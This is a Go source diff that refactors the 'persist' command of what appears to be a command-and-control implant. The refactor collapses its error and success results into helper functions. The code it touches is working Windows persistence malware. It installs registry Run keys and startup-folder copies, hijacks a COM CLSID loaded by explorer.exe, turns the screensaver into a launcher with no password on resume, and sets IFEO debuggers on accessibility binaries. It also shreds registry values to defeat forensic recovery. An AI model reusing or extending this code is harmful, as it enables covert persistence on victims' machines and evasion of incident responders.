@@ -40,19 +40,11 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 	var args persistArgs
 
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: parameters required (method, action, name, path)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: parameters required (method, action, name, path)")
 	}
 
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	if args.Action == "" {
@@ -73,22 +65,14 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 	case "list":
 		return listPersistence(args)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, or list", args.Method),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, or list", args.Method)
 	}
 }
 
 // persistRegistryRun adds/removes a registry Run key entry
 func persistRegistryRun(args persistArgs) structs.CommandResult {
 	if args.Name == "" {
-		return structs.CommandResult{
-			Output:    "Error: name is required for registry persistence",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: name is required for registry persistence")
 	}
 
 	// Determine hive — default to HKCU (doesn't need admin)
@@ -107,11 +91,7 @@ func persistRegistryRun(args persistArgs) structs.CommandResult {
 		hiveKey = registry.LOCAL_MACHINE
 		regPath = `Software\Microsoft\Windows\CurrentVersion\Run`
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: unsupported hive '%s'. Use HKCU or HKLM", hive),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: unsupported hive '%s'. Use HKCU or HKLM", hive)
 	}
 
 	switch strings.ToLower(args.Action) {
@@ -120,65 +100,37 @@ func persistRegistryRun(args persistArgs) structs.CommandResult {
 			// Default to current executable
 			exe, err := os.Executable()
 			if err != nil {
-				return structs.CommandResult{
-					Output:    fmt.Sprintf("Error getting executable path: %v", err),
-					Status:    "error",
-					Completed: true,
-				}
+				return errorf("Error getting executable path: %v", err)
 			}
 			args.Path = exe
 		}
 
 		key, _, err := registry.CreateKey(hiveKey, regPath, registry.SET_VALUE)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error opening %s\\%s: %v", hive, regPath, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error opening %s\\%s: %v", hive, regPath, err)
 		}
 		defer key.Close()
 
 		if err := key.SetStringValue(args.Name, args.Path); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error writing registry value: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error writing registry value: %v", err)
 		}
 
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Installed registry run key:\n  Key:   %s\\%s\n  Name:  %s\n  Value: %s", hive, regPath, args.Name, args.Path),
-			Status:    "success",
-			Completed: true,
-		}
+		return successf("Installed registry run key:\n  Key:   %s\\%s\n  Name:  %s\n  Value: %s", hive, regPath, args.Name, args.Path)
 
 	case "remove":
 		key, err := registry.OpenKey(hiveKey, regPath, registry.SET_VALUE|registry.QUERY_VALUE)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error opening %s\\%s: %v", hive, regPath, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error opening %s\\%s: %v", hive, regPath, err)
 		}
 		defer key.Close()
 
 		// Shred value before deletion to defeat forensic registry recovery
 		shredRegistryValue(key, args.Name)
 
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Removed registry run key (shredded):\n  Key:  %s\\%s\n  Name: %s", hive, regPath, args.Name),
-			Status:    "success",
-			Completed: true,
-		}
+		return successf("Removed registry run key (shredded):\n  Key:  %s\\%s\n  Name: %s", hive, regPath, args.Name)
 
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: unknown action '%s'. Use: install or remove", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
 	}
 }
 
@@ -191,11 +143,7 @@ func persistStartupFolder(args persistArgs) structs.CommandResult {
 		if args.Path == "" {
 			exe, err := os.Executable()
 			if err != nil {
-				return structs.CommandResult{
-					Output:    fmt.Sprintf("Error getting executable path: %v", err),
-					Status:    "error",
-					Completed: true,
-				}
+				return errorf("Error getting executable path: %v", err)
 			}
 			args.Path = exe
 		}
@@ -209,77 +157,42 @@ func persistStartupFolder(args persistArgs) structs.CommandResult {
 		// Copy the file to the startup folder
 		src, err := os.Open(args.Path)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error opening source '%s': %v", args.Path, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error opening source '%s': %v", args.Path, err)
 		}
 		defer src.Close()
 
 		dst, err := os.Create(destPath)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error creating '%s': %v", destPath, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error creating '%s': %v", destPath, err)
 		}
 		defer dst.Close() // Safety net for panics; explicit Close below catches flush errors
 		bytes, err := io.Copy(dst, src)
 		if err != nil {
 			dst.Close()
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error copying file: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error copying file: %v", err)
 		}
 
 		if err := dst.Close(); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error finalizing destination file: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error finalizing destination file: %v", err)
 		}
 
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Installed startup folder persistence:\n  Source: %s\n  Dest:   %s\n  Size:   %d bytes", args.Path, destPath, bytes),
-			Status:    "success",
-			Completed: true,
-		}
+		return successf("Installed startup folder persistence:\n  Source: %s\n  Dest:   %s\n  Size:   %d bytes", args.Path, destPath, bytes)
 
 	case "remove":
 		if args.Name == "" {
-			return structs.CommandResult{
-				Output:    "Error: name is required to remove startup folder entry",
-				Status:    "error",
-				Completed: true,
-			}
+			return errorResult("Error: name is required to remove startup folder entry")
 		}
 
 		destPath := filepath.Join(startupDir, args.Name)
-		if err := os.Remove(destPath); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error removing '%s': %v", destPath, err),
-				Status:    "error",
-				Completed: true,
-			}
+		secureRemove(destPath)
+		if _, err := os.Stat(destPath); err == nil {
+			return errorf("Error removing '%s': file still exists", destPath)
 		}
 
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Removed startup folder entry: %s", destPath),
-			Status:    "success",
-			Completed: true,
-		}
+		return successf("Removed startup folder entry: %s", destPath)
 
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: unknown action '%s'. Use: install or remove", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
 	}
 }
 
@@ -412,11 +325,7 @@ func listPersistence(args persistArgs) structs.CommandResult {
 		}
 	}
 
-	return structs.CommandResult{
-		Output:    strings.Join(lines, "\n"),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(strings.Join(lines, "\n"))
 }
 
 // defaultCLSID is MruPidlList — loaded by explorer.exe at shell startup, highly reliable.
@@ -427,11 +336,7 @@ func persistCOMHijack(args persistArgs) structs.CommandResult {
 	if args.Path == "" && args.Action == "install" {
 		exe, err := os.Executable()
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error getting executable path: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error getting executable path: %v", err)
 		}
 		args.Path = exe
 	}
@@ -451,37 +356,21 @@ func persistCOMHijack(args persistArgs) structs.CommandResult {
 	case "install":
 		key, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error creating HKCU\\%s: %v", keyPath, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error creating HKCU\\%s: %v", keyPath, err)
 		}
 		defer key.Close()
 
 		// Set (Default) value to our DLL/EXE path
 		if err := key.SetStringValue("", args.Path); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error setting DLL path: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error setting DLL path: %v", err)
 		}
 
 		// Set ThreadingModel (required for InprocServer32 to be used)
 		if err := key.SetStringValue("ThreadingModel", "Both"); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error setting ThreadingModel: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error setting ThreadingModel: %v", err)
 		}
 
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Installed COM hijack persistence:\n  CLSID:          %s\n  Key:            HKCU\\%s\n  DLL/EXE:        %s\n  ThreadingModel: Both\n  Trigger:        Loaded by explorer.exe at user logon", clsid, keyPath, args.Path),
-			Status:    "success",
-			Completed: true,
-		}
+		return successf("Installed COM hijack persistence:\n  CLSID:          %s\n  Key:            HKCU\\%s\n  DLL/EXE:        %s\n  ThreadingModel: Both\n  Trigger:        Loaded by explorer.exe at user logon", clsid, keyPath, args.Path)
 
 	case "remove":
 		// Shred values then delete InprocServer32 key, then the CLSID key
@@ -491,18 +380,10 @@ func persistCOMHijack(args persistArgs) structs.CommandResult {
 		// Best-effort cleanup of the parent CLSID key (may fail if it has other subkeys)
 		_ = registry.DeleteKey(registry.CURRENT_USER, parentPath)
 
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Removed COM hijack persistence (shredded):\n  CLSID: %s\n  Key:   HKCU\\%s", clsid, keyPath),
-			Status:    "success",
-			Completed: true,
-		}
+		return successf("Removed COM hijack persistence (shredded):\n  CLSID: %s\n  Key:   HKCU\\%s", clsid, keyPath)
 
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: unknown action '%s'. Use: install or remove", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
 	}
 }
 
@@ -515,11 +396,7 @@ func persistScreensaver(args persistArgs) structs.CommandResult {
 		if args.Path == "" {
 			exe, err := os.Executable()
 			if err != nil {
-				return structs.CommandResult{
-					Output:    fmt.Sprintf("Error getting executable path: %v", err),
-					Status:    "error",
-					Completed: true,
-				}
+				return errorf("Error getting executable path: %v", err)
 			}
 			args.Path = exe
 		}
@@ -531,64 +408,36 @@ func persistScreensaver(args persistArgs) structs.CommandResult {
 
 		key, err := registry.OpenKey(registry.CURRENT_USER, desktopKeyPath, registry.SET_VALUE)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error opening HKCU\\%s: %v", desktopKeyPath, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error opening HKCU\\%s: %v", desktopKeyPath, err)
 		}
 		defer key.Close()
 
 		// Set SCRNSAVE.EXE to our payload
 		if err := key.SetStringValue("SCRNSAVE.EXE", args.Path); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error setting SCRNSAVE.EXE: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error setting SCRNSAVE.EXE: %v", err)
 		}
 
 		// Enable screensaver
 		if err := key.SetStringValue("ScreenSaveActive", "1"); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error setting ScreenSaveActive: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error setting ScreenSaveActive: %v", err)
 		}
 
 		// Set idle timeout
 		if err := key.SetStringValue("ScreenSaveTimeout", timeout); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error setting ScreenSaveTimeout: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error setting ScreenSaveTimeout: %v", err)
 		}
 
 		// Disable password on resume (avoids locking user out)
 		if err := key.SetStringValue("ScreenSaverIsSecure", "0"); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error setting ScreenSaverIsSecure: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error setting ScreenSaverIsSecure: %v", err)
 		}
 
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Installed screensaver persistence:\n  Key:      HKCU\\%s\n  Payload:  %s\n  Timeout:  %s seconds\n  Secure:   No (no password on resume)\n  Trigger:  User idle for %s seconds → winlogon.exe launches payload", desktopKeyPath, args.Path, timeout, timeout),
-			Status:    "success",
-			Completed: true,
-		}
+		return successf("Installed screensaver persistence:\n  Key:      HKCU\\%s\n  Payload:  %s\n  Timeout:  %s seconds\n  Secure:   No (no password on resume)\n  Trigger:  User idle for %s seconds → winlogon.exe launches payload", desktopKeyPath, args.Path, timeout, timeout)
 
 	case "remove":
 		key, err := registry.OpenKey(registry.CURRENT_USER, desktopKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error opening HKCU\\%s: %v", desktopKeyPath, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error opening HKCU\\%s: %v", desktopKeyPath, err)
 		}
 		defer key.Close()
 
@@ -597,18 +446,10 @@ func persistScreensaver(args persistArgs) structs.CommandResult {
 		// Disable screensaver
 		_ = key.SetStringValue("ScreenSaveActive", "0")
 
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Removed screensaver persistence (shredded):\n  Shredded SCRNSAVE.EXE value\n  Disabled screensaver (ScreenSaveActive = 0)"),
-			Status:    "success",
-			Completed: true,
-		}
+		return successf("Removed screensaver persistence (shredded):\n  Shredded SCRNSAVE.EXE value\n  Disabled screensaver (ScreenSaveActive = 0)")
 
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: unknown action '%s'. Use: install or remove", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
 	}
 }
 
@@ -625,11 +466,7 @@ var ifeoTargets = [][2]string{
 // When the target executable is launched, Windows runs the debugger binary instead.
 func persistIFEO(args persistArgs) structs.CommandResult {
 	if args.Name == "" {
-		return structs.CommandResult{
-			Output:    "Error: name is required (target executable, e.g., sethc.exe, utilman.exe, osk.exe)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: name is required (target executable, e.g., sethc.exe, utilman.exe, osk.exe)")
 	}
 
 	ifeoBasePath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
@@ -640,31 +477,19 @@ func persistIFEO(args persistArgs) structs.CommandResult {
 		if args.Path == "" {
 			exe, err := os.Executable()
 			if err != nil {
-				return structs.CommandResult{
-					Output:    fmt.Sprintf("Error getting executable path: %v", err),
-					Status:    "error",
-					Completed: true,
-				}
+				return errorf("Error getting executable path: %v", err)
 			}
 			args.Path = exe
 		}
 
 		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error creating HKLM\\%s: %v (admin required)", keyPath, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error creating HKLM\\%s: %v (admin required)", keyPath, err)
 		}
 		defer key.Close()
 
 		if err := key.SetStringValue("Debugger", args.Path); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error setting Debugger value: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error setting Debugger value: %v", err)
 		}
 
 		// Identify the trigger for display
@@ -676,38 +501,22 @@ func persistIFEO(args persistArgs) structs.CommandResult {
 			}
 		}
 
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Installed IFEO persistence:\n  Key:      HKLM\\%s\n  Debugger: %s\n  Trigger:  %s\n  Note:     Requires admin. Target exe passes as first argument to debugger.", keyPath, args.Path, trigger),
-			Status:    "success",
-			Completed: true,
-		}
+		return successf("Installed IFEO persistence:\n  Key:      HKLM\\%s\n  Debugger: %s\n  Trigger:  %s\n  Note:     Requires admin. Target exe passes as first argument to debugger.", keyPath, args.Path, trigger)
 
 	case "remove":
 		key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE|registry.QUERY_VALUE)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error opening HKLM\\%s: %v", keyPath, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error opening HKLM\\%s: %v", keyPath, err)
 		}
 		defer key.Close()
 
 		// Shred Debugger value before deletion to defeat forensic recovery
 		shredRegistryValue(key, "Debugger")
 
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Removed IFEO persistence (shredded):\n  Key:    HKLM\\%s\n  Shredded Debugger value", keyPath),
-			Status:    "success",
-			Completed: true,
-		}
+		return successf("Removed IFEO persistence (shredded):\n  Key:    HKLM\\%s\n  Shredded Debugger value", keyPath)
 
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: unknown action '%s'. Use: install or remove", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
 	}
 }
 
